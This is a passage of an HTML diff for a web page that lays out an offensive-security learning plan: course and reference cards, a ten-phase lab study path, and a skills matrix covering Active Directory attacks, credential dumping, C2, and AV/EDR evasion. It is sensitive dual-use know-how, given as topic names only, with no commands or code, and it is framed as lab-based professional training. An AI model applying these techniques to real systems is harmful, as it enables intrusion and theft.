+      <div class="card-tags">
+        <span class="tag">Active Directory</span>
+        <span class="tag">BloodHound</span>
+        <span class="tag">Kerberoasting</span>
+        <span class="tag">Pass-the-Hash</span>
+        <span class="tag">DCSync</span>
+        <span class="tag">Lateral Movement</span>
+        <span class="tag">Impacket</span>
+      </div>
+      <a class="card-url" href="https://youtube.com/@TCMSecurityAcademy" target="_blank">↗ youtube.com/@TCMSecurityAcademy</a>
+    </div>
+
+    <!-- HackTricks -->
+    <div class="resource-card" style="--card-color: #00e5ff;">
+      <div class="card-header">
+        <div class="card-index">07</div>
+        <div class="card-title-group">
+          <div class="card-name">HackTricks</div>
+          <div class="card-role">C2 &amp; Post-Exploitation // Operator's Bible</div>
+        </div>
+        <div class="card-badge">GitBook · Free</div>
+      </div>
+      <div class="card-desc">
+        The most comprehensive free post-exploitation reference on the internet. HackTricks covers
+        every phase after initial access: persistence mechanisms, privilege escalation chains (Linux
+        &amp; Windows), lateral movement techniques, credential dumping, C2 framework setup
+        (Sliver, Havoc, Metasploit), OPSEC considerations, and data exfiltration. Not a course —
+        a live operator reference. Bookmark it. Search it mid-engagement. Contribute to it.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Post-Exploitation</span>
+        <span class="tag">C2 Frameworks</span>
+        <span class="tag">Persistence</span>
+        <span class="tag">Credential Dumping</span>
+        <span class="tag">Lateral Movement</span>
+        <span class="tag">Linux PrivEsc</span>
+        <span class="tag">Windows PrivEsc</span>
+      </div>
+      <a class="card-url" href="https://book.hacktricks.xyz" target="_blank">↗ book.hacktricks.xyz</a>
+    </div>
+
+    <!-- Antisyphon Training -->
+    <div class="resource-card" style="--card-color: #ff6060;">
+      <div class="card-header">
+        <div class="card-index">08</div>
+        <div class="card-title-group">
+          <div class="card-name">Antisyphon Training</div>
+          <div class="card-role">AV Evasion &amp; EDR Bypass // Pay-What-You-Can</div>
+        </div>
+        <div class="card-badge">Live/VOD · $0+</div>
+      </div>
+      <div class="card-desc">
+        John Strand's Antisyphon platform offers pay-what-you-can live and recorded courses —
+        accessible at $0 if needed. Key courses cover defense evasion, AV/EDR bypass fundamentals,
+        payload obfuscation, in-memory execution, AMSI bypass, and understanding how modern
+        endpoint detection works so you can evade it. Taught by practitioners who run real red team
+        ops. The "Getting Started in Security" series is a strong entry point before diving into
+        the evasion-specific courses.
+      </div>
+      <div class="card-tags">
+        <span class="tag">AV Bypass</span>
+        <span class="tag">EDR Evasion</span>
+        <span class="tag">AMSI Bypass</span>
+        <span class="tag">Payload Obfuscation</span>
+        <span class="tag">In-Memory Execution</span>
+        <span class="tag">Defense Evasion</span>
+      </div>
+      <a class="card-url" href="https://antisyphontraining.com" target="_blank">↗ antisyphontraining.com</a>
+    </div>
+
+    <!-- TryHackMe -->
+    <div class="resource-card" style="--card-color: #ff5da0;">
+      <div class="card-header">
+        <div class="card-index">09</div>
+        <div class="card-title-group">
+          <div class="card-name">TryHackMe</div>
+          <div class="card-role">Structured Guided Paths // PrivEsc · AD · C2 Intro</div>
+        </div>
+        <div class="card-badge">Browser · Free Tier</div>
+      </div>
+      <div class="card-desc">
+        Where HTB's free tier runs thin, TryHackMe's free rooms fill the gap. The free tier includes
+        guided learning paths for Linux PrivEsc, Windows PrivEsc, Active Directory basics, Metasploit,
+        and persistence — all browser-based with an in-page attack machine. Pre-Security and Jr
+        Penetration Tester paths are partially free and provide the clearest structured progression
+        available at $0. Essential for learners who need more hand-holding than raw VulnHub boxes provide.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Linux PrivEsc</span>
+        <span class="tag">Windows PrivEsc</span>
+        <span class="tag">AD Basics</span>
+        <span class="tag">Persistence</span>
+        <span class="tag">Guided Rooms</span>
+        <span class="tag">In-Browser VM</span>
+      </div>
+      <a class="card-url" href="https://tryhackme.com" target="_blank">↗ tryhackme.com</a>
+    </div>
+
+    <!-- LOLBAS / GTFOBins -->
+    <div class="resource-card" style="--card-color: #ffd700;">
+      <div class="card-header">
+        <div class="card-index">10</div>
+        <div class="card-title-group">
+          <div class="card-name">LOLBAS + GTFOBins + LOLOL</div>
+          <div class="card-role">Living Off the Land // Detection-Free Execution</div>
+        </div>
+        <div class="card-badge">Reference · 100% Free</div>
+      </div>
+      <div class="card-desc">
+        The holy trinity of living-off-the-land references. LOLBAS (Windows) catalogs every trusted
+        binary that can execute payloads, download files, or bypass controls — without dropping custom
+        tools. GTFOBins (Linux) does the same for Unix environments. LOLOL aggregates both plus
+        driver-based and COM-based abuse. Using trusted system binaries is the core technique for
+        post-exploitation and AV/EDR evasion without writing a single line of malware. Study and
+        memorise the most common entries — they appear on every real engagement.
+      </div>
+      <div class="card-tags">
+        <span class="tag">LOLBins</span>
+        <span class="tag">GTFOBins</span>
+        <span class="tag">Payload Execution</span>
+        <span class="tag">AV Evasion</span>
+        <span class="tag">Post-Exploitation</span>
+        <span class="tag">Trusted Binaries</span>
+        <span class="tag">Defense Evasion</span>
+      </div>
+      <a class="card-url" href="https://lolbas-project.github.io" target="_blank">↗ lolbas-project.github.io</a>
+      &nbsp;&nbsp;
+      <a class="card-url" href="https://gtfobins.github.io" target="_blank">↗ gtfobins.github.io</a>
+    </div>
+
+    <!-- OpenSecurityTraining2 -->
+    <div class="resource-card" style="--card-color: #ff8c00;">
+      <div class="card-header">
+        <div class="card-index">11</div>
+        <div class="card-title-group">
+          <div class="card-name">OpenSecurityTraining2</div>
+          <div class="card-role">Malware Dev · RE · Low-Level Exploitation // University Grade</div>
+        </div>
+        <div class="card-badge">Video · 100% Free</div>
+      </div>
+      <div class="card-desc">
+        University-level offensive security courses — completely free. OST2's catalogue includes
+        Architecture &amp; OS Internals (x86/x64), Malware Dynamic Analysis, Introduction to Trusted
+        Computing, and Intermediate Intel x64 RE. This is the resource that takes your AV/EDR bypass
+        understanding from "I know the techniques" to "I understand why they work at the OS level."
+        Required if you want to write your own shellcode, understand loader internals, or reason about
+        EDR hooking. No other free resource goes this deep.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Malware Analysis</span>
+        <span class="tag">x86/x64 Internals</span>
+        <span class="tag">Reverse Engineering</span>
+        <span class="tag">Shellcode</span>
+        <span class="tag">EDR Internals</span>
+        <span class="tag">OS Architecture</span>
+        <span class="tag">Loader Mechanics</span>
+      </div>
+      <a class="card-url" href="https://ost2.fyi" target="_blank">↗ ost2.fyi</a>
+    </div>
+
+  </div><!-- /resources-grid -->
+
+  <hr class="divider">
+
+  <!-- ══════════════════════════════════════════════════
+       PAID COMPLETE STACK — ~$640 to close every gap
+       ══════════════════════════════════════════════════ -->
+  <div class="section-label">Paid Complete Stack // ~$640 — Close Every Gap</div>
+
+  <div class="intro-block" style="border-left-color:var(--amber);">
+    <p>The free stack above hits a hard ceiling on production implants, Cobalt Strike tradecraft, BOF development, kernel-mode evasion, and structured report writing. The three resources below are the minimum-spend path to close all of those gaps simultaneously — chosen for price-to-coverage ratio, not brand recognition. Total outlay: <strong style="color:var(--amber)">~$600–640</strong> depending on WMD1 pledge and regional pricing.</p>
+  </div>
+
+  <div class="resources-grid">
+
+    <!-- WMD 1 — JustHacking -->
+    <div class="resource-card" style="--card-color: #ff3030;">
+      <div class="card-header">
+        <div class="card-index" style="color:rgba(255,48,48,0.25);">P1</div>
+        <div class="card-title-group">
+          <div class="card-name">JustHacking — WMD 1</div>
+          <div class="card-role">Malware Dev Basics &amp; Shellcode Loaders // Entry Point</div>
+        </div>
+        <div class="card-badge" style="border-color:#ff3030;color:#ff3030;">Paid · ~$90</div>
+      </div>
+      <div class="card-desc">
+        Name-your-price course (suggested ~$80–100) covering shellcode writing, custom loader development, and the foundational malware concepts that the free stack only introduces. WMD 1 gets you writing real PE loaders and understanding injection techniques hands-on — quickly and without the heavyweight commitment of Maldev Academy. Think of it as the bridge between OST2 theory and full implant development. Lightweight, no lab infra required beyond your own machine. Start here before ARTOC if maldev is the primary gap.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Shellcode Dev</span>
+        <span class="tag">PE Loaders</span>
+        <span class="tag">Process Injection</span>
+        <span class="tag">Malware Basics</span>
+        <span class="tag">Windows Internals</span>
+        <span class="tag">Name-Your-Price</span>
+      </div>
+      <a class="card-url" href="https://justhacking.com" target="_blank">↗ justhacking.com</a>
+    </div>
+
+    <!-- ARTOC — White Knight Labs -->
+    <div class="resource-card" style="--card-color: #ffb000;">
+      <div class="card-header">
+        <div class="card-index" style="color:rgba(255,176,0,0.25);">P2</div>
+        <div class="card-title-group">
+          <div class="card-name">White Knight Labs — ARTOC</div>
+          <div class="card-role">Advanced Red Team Ops // Production Implants · Cobalt Strike · BOF · Reports</div>
+        </div>
+        <div class="card-badge" style="border-color:#ffb000;color:#ffb000;">Paid · ~$500</div>
+      </div>
+      <div class="card-desc">
+        The single course that closes the most gaps at once. ARTOC (Advanced Red Team Operations Course) is an on-demand course covering the complete professional red team workflow: production-grade implant and loader development, advanced Cobalt Strike tradecraft (profiles, staged/stageless, malleable C2), BOF (Beacon Object File) development from scratch, kernel-mode and EDR bypass techniques, resilient C2 infrastructure on AWS, engagement OPSEC, and — critically — structured report writing and client-facing deliverables. Labs run in private cloud AWS environments, eliminating the local RAM/VM hardware requirement entirely. This is why the Complete Stack beats buying CRTO + Sektor7 separately: it costs less and covers the report writing and kernel evasion gaps neither of those courses touch.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Cobalt Strike</span>
+        <span class="tag">BOF Development</span>
+        <span class="tag">Custom Loaders</span>
+        <span class="tag">Kernel Bypass</span>
+        <span class="tag">EDR Evasion</span>
+        <span class="tag">Malleable C2</span>
+        <span class="tag">AWS Lab Infra</span>
+        <span class="tag">Report Writing</span>
+        <span class="tag">Engagement OPSEC</span>
+        <span class="tag">Resilient C2</span>
+      </div>
+      <a class="card-url" href="https://whiteknightlabs.com/adversary-red-team-operations-course" target="_blank">↗ whiteknightlabs.com — ARTOC</a>
+    </div>
+
+    <!-- Snap Labs — Black Hills -->
+    <div class="resource-card" style="--card-color: #00bfff;">
+      <div class="card-header">
+        <div class="card-index" style="color:rgba(0,191,255,0.25);">P3</div>
+        <div class="card-title-group">
+          <div class="card-name">Snap Labs — Black Hills Information Security</div>
+          <div class="card-role">Full Windows AD Cloud Ranges // No Local Hardware Required</div>
+        </div>
+        <div class="card-badge" style="border-color:#00bfff;color:#00bfff;">Pay-Per-Use · ~$5–20 total</div>
+      </div>
+      <div class="card-desc">
+        Snap Labs solves the hardware paywall entirely. Black Hills' cloud-based Active Directory ranges spin up full enterprise-grade Windows AD environments in your browser — no VirtualBox, no 8GB RAM requirement, no local VM wrangling. Billing is AWS-cost-only with auto-stop controls, so a full practice session typically costs a few dollars. Use it alongside ARTOC lab work for unlimited AD environment practice, engagement simulation, and C2 callback testing without touching your local machine's resources. The cheapest way to run realistic multi-host AD scenarios on any hardware.
+      </div>
+      <div class="card-tags">
+        <span class="tag">Cloud AD Labs</span>
+        <span class="tag">Windows Environments</span>
+        <span class="tag">Browser-Based</span>
+        <span class="tag">No Local RAM</span>
+        <span class="tag">Pay-Per-Use</span>
+        <span class="tag">Auto-Stop Billing</span>
+        <span class="tag">Multi-Host</span>
+      </div>
+      <a class="card-url" href="https://www.blackhillsinfosec.com/projects/snap-labs/" target="_blank">↗ blackhillsinfosec.com — Snap Labs</a>
+    </div>
+
+  </div><!-- /paid resources-grid -->
+
+  <hr class="divider">
+
+  <!-- LEARNING PATH -->
+  <div class="path-section">
+    <div class="section-label">Execution Path // 10-Phase Self-Learner Study Plan</div>
+
+    <!-- ── FOUNDATION TIER ── -->
+    <div class="path-group-label lvl-foundation">▸ FOUNDATION TIER — Build Your Base</div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node"></div><div class="path-line"></div></div>
+      <div class="path-item">
+        <div class="path-phase">01</div>
+        <div class="path-content">
+          <div class="path-title">ENVIRONMENT SETUP</div>
+          <div class="path-detail">Install VirtualBox. Deploy Kali Linux (OVA). Configure a host-only adapter + NAT adapter. Snapshot the clean state immediately. Install VSCodium for note-taking. Create a folder structure: /notes, /tools, /loot, /reports. Your lab discipline starts here — never skip snapshots.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">HackerSploit — Lab Setup videos</span>
+            <span class="path-resource-pill">VulnHub — VM import guides</span>
+          </div>
+          <div class="path-milestone">VMs boot correctly, Kali reaches internet, snapshot saved.</div>
+        </div>
+        <div class="path-duration">WEEK 1</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node"></div><div class="path-line"></div></div>
+      <div class="path-item">
+        <div class="path-phase">02</div>
+        <div class="path-content">
+          <div class="path-title">LINUX FUNDAMENTALS — OverTheWire Bandit</div>
+          <div class="path-detail">Complete Bandit levels 0–34. Spend 20+ minutes on each before checking hints. Document every command you used and why it worked in your notes file. Required cold: SSH, find, grep, pipes, file permissions, base64, cron, tar, nc. Then attempt OTW Leviathan for a first taste of privilege escalation.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">OverTheWire — Bandit 0–34</span>
+            <span class="path-resource-pill">OverTheWire — Leviathan</span>
+          </div>
+          <div class="path-milestone">Bandit 34 completed. Can navigate Linux blindfolded.</div>
+        </div>
+        <div class="path-duration">WEEKS 1–3</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node"></div><div class="path-line"></div></div>
+      <div class="path-item">
+        <div class="path-phase">03</div>
+        <div class="path-content">
+          <div class="path-title">PENTEST THEORY &amp; CORE TOOLING — HackerSploit</div>
+          <div class="path-detail">Work through HackerSploit phases 1–6: methodology, recon/OSINT, DNS enumeration, and the full Nmap module. Pause on every tool demo and replicate it in your Kali VM before continuing. Build a personal cheatsheet as you go — you will reference it constantly. Watch HackerSploit phases 7–8 for Metasploit and web app intro. This runs in parallel with Phase 04 — alternate days between theory and web labs.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">HackerSploit — Phases 1–8</span>
+          </div>
+          <div class="path-milestone">HackerSploit checklist phases 1–6 complete. Own cheatsheet written.</div>
+        </div>
+        <div class="path-duration">WEEKS 2–5</div>
+      </div>
+    </div>
+
+    <!-- ── CORE TIER ── -->
+    <div class="path-group-label lvl-core">▸ CORE TIER — Web Attacks &amp; Real Machines</div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-core"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-core">
+        <div class="path-phase" style="color:var(--amber)">04</div>
+        <div class="path-content">
+          <div class="path-title lvl-core">WEB ATTACK FUNDAMENTALS — PortSwigger Academy</div>
+          <div class="path-detail">Start with Phase 0 (server-side overview), then Phase 1 in this exact order: SQLi → Path Traversal → File Upload → Authentication → CSRF → CORS → Clickjacking. Solve every lab before reading the solution — cheat and you cheat yourself. Open Burp Suite Community alongside every lab. Intercept every request. Read every response. PortSwigger Phase 5 (Burp tooling) can be done in parallel from week 4 onward.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">PortSwigger — Phases 0–2</span>
+            <span class="path-resource-pill">PortSwigger — Phase 5 (Burp)</span>
+          </div>
+          <div class="path-milestone">20+ PortSwigger labs solved. Burp proxy is muscle memory.</div>
+        </div>
+        <div class="path-duration">WEEKS 4–9</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-core"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-core">
+        <div class="path-phase" style="color:var(--amber)">05</div>
+        <div class="path-content">
+          <div class="path-title lvl-core">FIRST REAL MACHINES — HTB Starting Point + VulnHub</div>
+          <div class="path-detail">Begin with HTB Starting Point Tier 0 (fully guided). Then Tier 1 (hints only). Then shift to VulnHub: Kioptrix 1 → Kioptrix 2 → Kioptrix 3 → DC-1. For every machine: run nmap first, save all output (-oA), document every step in a text file, capture a screenshot of every flag. If stuck 2h: read a hint. If stuck 4h: read a walkthrough but understand every command. Replay any machine you used a walkthrough for from scratch.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">Hack The Box — Starting Point Tier 0–1</span>
+            <span class="path-resource-pill">VulnHub — Kioptrix 1→2→3, DC-1</span>
+            <span class="path-resource-pill">HackTricks — reference mid-box</span>
+          </div>
+          <div class="path-milestone">5 machines rooted. 2 without any hints. Notes for every box.</div>
+        </div>
+        <div class="path-duration">WEEKS 7–13</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-core"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-core">
+        <div class="path-phase" style="color:var(--amber)">06</div>
+        <div class="path-content">
+          <div class="path-title lvl-core">PRIVILEGE ESCALATION — TryHackMe + GTFOBins + LOLBAS</div>
+          <div class="path-detail">PrivEsc is the skill that turns a foothold into an owned machine. Work the TryHackMe "Linux Privilege Escalation" and "Windows Privilege Escalation" rooms (both free). Study GTFOBins and LOLBAS as live references — not just tools to look up, but techniques to internalise. Apply each technique to a VulnHub machine the same day you learn it. Cover: SUID abuse, sudo misconfig, weak service perms, DLL hijacking, token impersonation, unquoted service paths, AlwaysInstallElevated.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">TryHackMe — Linux PrivEsc room</span>
+            <span class="path-resource-pill">TryHackMe — Windows PrivEsc room</span>
+            <span class="path-resource-pill">GTFOBins</span>
+            <span class="path-resource-pill">LOLBAS</span>
+            <span class="path-resource-pill">VulnHub — Mr-Robot, Stapler</span>
+          </div>
+          <div class="path-milestone">PrivEsc on both Linux and Windows machines using 3+ different techniques.</div>
+        </div>
+        <div class="path-duration">WEEKS 10–14</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-core"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-core">
+        <div class="path-phase" style="color:var(--amber)">07</div>
+        <div class="path-content">
+          <div class="path-title lvl-core">WEB ATTACKS ADVANCED — PortSwigger Phases 3–4</div>
+          <div class="path-detail">Return to PortSwigger for the advanced server-side module (SSRF, NoSQL, Race Conditions, Cache Deception) and the modern attack surface module (WebSockets, Prototype Pollution, LLM/Prompt Injection). These techniques appear in real bug bounty and red team engagements. Tackle VulnHub machines with a web focus during this phase: Mr-Robot (WordPress exploitation), DC-1 (Drupal RCE). Apply PortSwigger API testing knowledge to any REST endpoints you encounter.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">PortSwigger — Phases 3–4</span>
+            <span class="path-resource-pill">VulnHub — Mr-Robot, DC-1</span>
+            <span class="path-resource-pill">HackTricks — web reference</span>
+          </div>
+          <div class="path-milestone">All PortSwigger CRITICAL + CORE modules completed. Mr-Robot rooted.</div>
+        </div>
+        <div class="path-duration">WEEKS 12–18</div>
+      </div>
+    </div>
+
+    <!-- ── ADVANCED TIER ── -->
+    <div class="path-group-label lvl-advanced">▸ ADVANCED TIER — Active Directory &amp; Post-Exploitation</div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-advanced"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-advanced">
+        <div class="path-phase" style="color:#bf5fff">08</div>
+        <div class="path-content">
+          <div class="path-title lvl-advanced">ACTIVE DIRECTORY ATTACK CHAIN — TCM Security</div>
+          <div class="path-detail">Build a home AD lab: 1x Windows Server 2019 DC + 1x Windows 10 workstation, both in VirtualBox with host-only networking. Follow TCM Security's full AD attack series in order: setup → enumeration (PowerView, BloodHound) → initial attack vectors (LLMNR poisoning, SMB relay) → post-compromise enumeration → Kerberoasting → AS-REP Roasting → pass-the-hash → pass-the-ticket → token impersonation → DCSync → Golden/Silver Tickets. Run every technique in your own lab. Build a command reference sheet for each attack.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">TCM Security — Full AD Series</span>
+            <span class="path-resource-pill">TryHackMe — AD Basic rooms (free)</span>
+            <span class="path-resource-pill">HackTricks — AD reference</span>
+          </div>
+          <div class="path-milestone">DCSync completed in home lab. BloodHound attack path documented end-to-end.</div>
+        </div>
+        <div class="path-duration">MONTHS 4–5</div>
+      </div>
+    </div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-advanced"></div><div class="path-line"></div></div>
+      <div class="path-item lvl-advanced">
+        <div class="path-phase" style="color:#bf5fff">09</div>
+        <div class="path-content">
+          <div class="path-title lvl-advanced">POST-EXPLOITATION &amp; C2 — HackTricks + LOLBAS + TryHackMe</div>
+          <div class="path-detail">Study post-exploitation systematically using HackTricks as your primary reference. Cover in order: persistence mechanisms (registry, scheduled tasks, services) → credential dumping (LSASS, SAM, NTDS.dit) → lateral movement (WMI, PsExec, WinRM, SMB) → data exfiltration (DNS, HTTPS channels). Set up Metasploit as your first C2 in your lab: establish sessions, pivot through subnets, run post modules. Advance to Sliver C2 (free, open-source) for a realistic operator experience. LOLBAS is your cheat sheet for executing each technique without custom tooling.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">HackTricks — Post-Exploitation</span>
+            <span class="path-resource-pill">LOLBAS — execution &amp; persistence</span>
+            <span class="path-resource-pill">TryHackMe — Persistence, C2 rooms</span>
+            <span class="path-resource-pill">Sliver C2 — docs.sliver.sh</span>
+          </div>
+          <div class="path-milestone">Persistent beacon running in lab. Lateral movement to second host achieved. Creds dumped.</div>
+        </div>
+        <div class="path-duration">MONTHS 5–6</div>
+      </div>
+    </div>
+
+    <!-- ── SPECIALIST TIER ── -->
+    <div class="path-group-label lvl-specialist">▸ SPECIALIST TIER — Evasion &amp; Operator Tradecraft</div>
+
+    <div class="path-row">
+      <div class="path-connector"><div class="path-node lvl-specialist"></div></div>
+      <div class="path-item lvl-specialist">
+        <div class="path-phase" style="color:var(--red)">10</div>
+        <div class="path-content">
+          <div class="path-title lvl-specialist">AV EVASION &amp; EDR BYPASS — Antisyphon + OST2 + LOLBAS</div>
+          <div class="path-detail">Start with Antisyphon's pay-what-you-can courses on defense evasion and AV bypass fundamentals — these teach AMSI bypass, payload obfuscation, and in-memory execution from a practitioner's perspective. Then go deeper with OST2's "Malware Dynamic Analysis" and "Architecture &amp; OS Internals" courses to understand why detections fire and how to reason around them at the OS level. Apply LOLBAS/LOTL techniques as your primary evasion layer — trusted binaries detected less than custom code. Goal: reliably bypass Windows Defender in your lab with a stageless payload and a LOLBIN-based execution chain. Document every technique in a personal tradecraft reference.</div>
+          <div class="path-resources">
+            <span class="path-resource-pill">Antisyphon — Defense Evasion course</span>
+            <span class="path-resource-pill">OST2 — Malware Dynamic Analysis</span>
+            <span class="path-resource-pill">OST2 — Architecture &amp; OS Internals</span>
+            <span class="path-resource-pill">LOLBAS — defense evasion techniques</span>
+          </div>
+          <div class="path-milestone">Windows Defender bypassed in lab with LOLBIN chain. AMSI patched in memory.</div>
+        </div>
+        <div class="path-duration">MONTH 6+</div>
+      </div>
+    </div>
+
+  </div><!-- /path -->
+
+  <hr class="divider">
+
+  <!-- STRENGTHS / WEAKNESSES -->
+  <div class="section-label">Stack Analysis // Strengths &amp; Gaps</div>
+
+  <div class="two-col">
+    <div class="sw-block">
+      <div class="sw-title pos">▲ Strengths</div>
+      <div class="sw-item"><span class="bullet">+</span> Fully functional from $0.00 — every gap skill now has a free resource mapped to it</div>
+      <div class="sw-item"><span class="bullet">+</span> 10-phase structured plan removes guesswork — each phase has a milestone gate</div>
+      <div class="sw-item"><span class="bullet">+</span> PortSwigger is best-in-class for web attacks, used by professional pentesters</div>
+      <div class="sw-item"><span class="bullet">+</span> TryHackMe fills the HTB free-tier gap with guided PrivEsc, AD, and persistence rooms</div>
+      <div class="sw-item"><span class="bullet">+</span> TCM Security covers AD attacks end-to-end at the same depth as paid courses</div>
+      <div class="sw-item"><span class="bullet">+</span> HackTricks + LOLBAS + GTFOBins form a complete post-exploitation reference stack</div>
+      <div class="sw-item"><span class="bullet">+</span> OST2 provides university-level OS internals and malware analysis — unique at $0</div>
+      <div class="sw-item"><span class="bullet">+</span> Antisyphon's pay-what-you-can model makes practitioner-taught EDR evasion accessible</div>
+    </div>
+    <div class="sw-block">
+      <div class="sw-title neg">▼ Hard Ceiling (Free Tier Limits)</div>
+      <div class="sw-item neg-item" style="text-decoration:line-through;opacity:0.45;"><span class="bullet neg">!</span> Custom loader / shellcode development stays at INTRO — writing production implants requires Maldev Academy or Sektor7 (paid)</div>
+      <div class="sw-item" style="margin-left:1rem;font-size:11px;color:#00cc33;margin-bottom:0.5rem;">✓ RESOLVED — WMD1 (shellcode/loaders) + ARTOC (production implants, full implant dev pipeline)</div>
+      <div class="sw-item neg-item" style="text-decoration:line-through;opacity:0.45;"><span class="bullet neg">!</span> Cobalt Strike tradecraft, BOF development, and kernel-mode bypass are not reachable for free at depth</div>
+      <div class="sw-item" style="margin-left:1rem;font-size:11px;color:#00cc33;margin-bottom:0.5rem;">✓ RESOLVED — ARTOC covers Cobalt Strike + BOF dev + kernel-mode evasion (partial depth on kernel)</div>
+      <div class="sw-item neg-item" style="text-decoration:line-through;opacity:0.45;"><span class="bullet neg">!</span> Report writing and client-facing engagement OPSEC are undercovered — no free structured course exists for this</div>
+      <div class="sw-item" style="margin-left:1rem;font-size:11px;color:#00cc33;margin-bottom:0.5rem;">✓ RESOLVED — ARTOC includes structured report writing module and client-facing engagement OPSEC</div>
+      <div class="sw-item neg-item" style="text-decoration:line-through;opacity:0.45;"><span class="bullet neg">!</span> Windows AD lab requires 2 extra VMs (~8GB RAM minimum) — hardware is the real paywall here</div>
+      <div class="sw-item" style="margin-left:1rem;font-size:11px;color:#00cc33;margin-bottom:0.5rem;">✓ RESOLVED — ARTOC uses private AWS cloud labs + Snap Labs for AD ranges; zero local RAM requirement</div>
+      <div class="sw-item neg-item"><span class="bullet neg">!</span> Self-discipline is the only accountability mechanism — no instructor, no deadlines, no cohort</div>
+      <div class="sw-item neg-item"><span class="bullet neg">!</span> Kernel-mode bypass covered at intermediate depth — full driver exploitation requires additional specialist research beyond ARTOC scope</div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- SKILLS COVERAGE -->
+  <div class="matrix-section">
+    <div class="section-label">Skills Coverage Matrix // Updated: Complete Stack Applied</div>
+
+    <div style="font-size:11px;color:var(--amber);margin-bottom:1rem;letter-spacing:1px;">
+      ▸ FREE STACK ONLY &nbsp;&nbsp; <span style="color:var(--green)">▸ +COMPLETE PAID STACK (~$640)</span>
+    </div>
+
+    <div class="skill-row">
+      <div class="skill-name">Linux Command Line</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:93%;--fill-color:var(--green)"></div></div>
+      <div class="skill-level">STRONG</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Web Application Attacks</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:95%;--fill-color:#ff6600"></div></div>
+      <div class="skill-level">STRONG</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Network Enumeration</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:80%;--fill-color:var(--green)"></div></div>
+      <div class="skill-level">SOLID</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Exploitation (Local Machines)</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:75%;--fill-color:#9fff4c"></div></div>
+      <div class="skill-level">SOLID</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Privilege Escalation</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:83%;--fill-color:var(--amber)"></div></div>
+      <div class="skill-level">SOLID</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Active Directory Attacks</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:94%;--fill-color:#bf5fff"></div></div>
+      <div class="skill-level" style="color:var(--green)">STRONG ↑</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">C2 / Post-Exploitation</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:92%;--fill-color:#00e5ff"></div></div>
+      <div class="skill-level" style="color:var(--green)">STRONG ↑</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Cobalt Strike Tradecraft</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:88%;--fill-color:#ffb000"></div></div>
+      <div class="skill-level" style="color:var(--green)">STRONG ✓</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">AV / EDR Evasion</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:88%;--fill-color:#ff8c00"></div></div>
+      <div class="skill-level" style="color:var(--green)">STRONG ↑</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Custom Malware Dev / Loaders</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:82%;--fill-color:var(--red)"></div></div>
+      <div class="skill-level" style="color:var(--green)">SOLID ↑</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Shellcode Development</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:80%;--fill-color:var(--red)"></div></div>
+      <div class="skill-level" style="color:var(--green)">SOLID ✓</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">BOF Development</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:83%;--fill-color:#bf5fff"></div></div>
+      <div class="skill-level" style="color:var(--green)">SOLID ✓</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Kernel-Mode / Driver Bypass</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:58%;--fill-color:#ff6060"></div></div>
+      <div class="skill-level">PARTIAL ↑</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Resilient C2 Infrastructure</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:85%;--fill-color:#00bfff"></div></div>
+      <div class="skill-level" style="color:var(--green)">SOLID ✓</div>
+    </div>
+    <div class="skill-row">
+      <div class="skill-name">Report Writing / Eng. OPSEC</div>
+      <div class="skill-bar"><div class="skill-fill" style="--target-width:87%;--fill-color:#557755"></div></div>
